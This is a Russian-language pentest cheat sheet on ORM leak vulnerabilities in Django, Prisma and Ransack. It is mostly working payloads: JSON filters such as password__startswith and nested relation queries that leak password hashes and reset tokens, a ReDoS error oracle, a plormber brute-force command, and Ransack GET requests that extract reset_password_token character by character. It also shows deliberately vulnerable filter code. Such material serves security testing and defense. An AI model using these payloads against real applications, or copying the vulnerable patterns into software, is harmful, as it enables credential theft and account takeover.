**Утечка через ORM (ORM Leak)**

> Уязвимость утечки через ORM возникает, когда конфиденциальная информация, такая как структура базы данных или данные пользователей, непреднамеренно раскрывается из-за неправильной обработки ORM-запросов. Это может произойти, если приложение возвращает необработанные сообщения об ошибках, отладочную информацию или позволяет злоумышленникам манипулировать запросами таким образом, чтобы раскрыть нижележащие данные.

**Краткое содержание**

*   Django (Python)
    *   Фильтр запросов
    *   Фильтрация по связям
        *   "Один-к-одному" (One-to-One)
        *   "Многие-ко-многим" (Many-to-Many)
    *   Утечка на основе ошибок - ReDOS
*   Prisma (Node.JS)
    *   Фильтрация по связям
        *   "Один-к-одному"
        *   "Многие-ко-многим"
*   Ransack (Ruby)
*   CVE (уязвимости)
*   Ссылки

**Django (Python)**

Следующий код является базовым примером ORM-запроса к базе данных.

```python
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

Проблема заключается в том, как ORM Django использует синтаксис параметров ключевых слов для построения QuerySet'ов. Используя оператор распаковки (`**`), пользователи могут динамически управлять аргументами ключевых слов, передаваемыми методу `filter`, что позволяет им фильтровать результаты по своему усмотрению.

**Фильтр запросов**

Атакующий может контролировать столбец для фильтрации результатов. ORM предоставляет операторы для сопоставления частей значений. Эти операторы могут использовать условие SQL `LIKE` в генерируемых запросах, выполнять сопоставление с регулярным выражением на основе контролируемых пользователем шаблонов или применять операторы сравнения, такие как `<` и `>`.

Пример полезной нагрузки:
```json
{
  "username": "admin",
  "password__startswith": "p"
}
```

Интересные фильтры для использования:
*   `__startswith`
*   `__contains`
*   `__regex`

**Фильтрация по связям**

Давайте используем этот отличный пример из статьи "PLORMBING YOUR DJANGO ORM" от Алекса Брауна (UML-example-app-simplified-highlight).

Мы можем видеть 2 типа связей:
*   Связи "Один-к-одному"
*   Связи "Многие-ко-многим"

**Связь "Один-к-одному"**

Фильтрация по пользователю, создавшему статью, и у которого пароль содержит символ 'p'.

```json
{
  "created_by__user__password__contains": "p"
}
```

**Связь "Многие-ко-многим"**

Почти то же самое, но нужно фильтровать больше.

1.  Получить ID пользователей: `created_by__departments__employees__user__id`
2.  Для каждого ID получить имя пользователя: `created_by__departments__employees__user__username`
3.  Наконец, извлечь хеш их пароля: `created_by__departments__employees__user__password`

Использование нескольких фильтров в одном запросе:

```json
{
  "created_by__departments__employees__user__username__startswith": "p",
  "created_by__departments__employees__user__id": 1
}
```

**Утечка на основе ошибок - ReDOS**

Если Django использует MySQL, вы также можете злоупотребить ReDOS, чтобы вызвать ошибку, когда фильтр не соответствует условию должным образом.

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => Возвращает что-то (успех)

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => Ошибка 500 (Timeout exceeded in regular expression match) - Превышен таймаут при сопоставлении с регулярным выражением
```

**Prisma (Node.JS)**

**Инструменты:**
*   `elttam/plormber` - инструмент для эксплуатации уязвимостей утечки через ORM на основе временных задержек.

Пример использования plormber:
```bash
plormber prisma-contains \
    --chars '0123456789abcdef' \
    --base-query-json '{"query": {PAYLOAD}}' \
    --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
    --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
    --verbose-stats \
    https://some.vuln.app/articles/time-based;
```

**Пример:**

Пример утечки через ORM в Node.JS с Prisma.

```javascript
const posts = await prisma.article.findMany({
  where: req.query.filter as any // Уязвимо для утечек через ORM
})
```

Использование `include` для возврата всех полей записей пользователей, создавших статью:

```json
{
  "filter": {
    "include": {
      "createdBy": true
    }
  }
}
```

Выбор только одного поля:

```json
{
  "filter": {
    "select": {
      "createdBy": {
        "select": {
          "password": true
        }
      }
    }
  }
}
```

**Фильтрация по связям**

**Связь "Один-к-одному"**

```json
{
  "filter[createdBy][resetToken][startsWith]": "06"
}
```

**Связь "Многие-ко-многим"**

Вот пример сложной вложенной фильтрации для извлечения данных через связи многие-ко-многим:

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "departments": {
                        "some": {
                          "employees": {
                            "some": {
                              "{полеДляУтечки}": {
                                "startsWith": "{тестовыйПрефикс}"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Ransack (Ruby)**

**Только для Ransack версии ниже 4.0.0.**

Общий подход к брутфорсу описан здесь: `ransack_bruteforce_overview`

**Извлечение поля `reset_password_token` пользователя:**

1.  `GET /posts?q[user_reset_password_token_start]=0` -> Пустая страница результатов
2.  `GET /posts?q[user_reset_password_token_start]=1` -> Пустая страница результатов
3.  `GET /posts?q[user_reset_password_token_start]=2` -> Результаты на странице

Затем уточнение символов:
1.  `GET /posts?q[user_reset_password_token_start]=2c` -> Пустая страница результатов
2.  `GET /posts?q[user_reset_password_token_start]=2f` -> Результаты на странице

**Нацеливание на конкретного пользователя и извлечение его ключа восстановления (`recoveries_key`):**

`GET /labs?q[creator_roles_name_cont]=superadmin&q[creator_recoveries_key_start]=0`
